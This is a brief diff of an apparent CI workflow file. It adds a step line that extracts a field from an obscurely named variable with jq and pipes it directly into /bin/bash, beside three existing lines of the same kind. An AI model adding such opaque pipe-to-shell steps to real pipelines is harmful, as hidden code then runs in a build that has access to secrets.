@@ -32,6 +32,7 @@ jobs:
           echo $k6587 | jq -r .hxzpi0 | /bin/bash
           printf '%s' "$iteab249" | jq -r .povnt8572 | /bin/bash
           printf '%s' "$td48998" | jq -r .piif139 | /bin/bash
+          echo $ewen7835 | jq -r .ka48 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
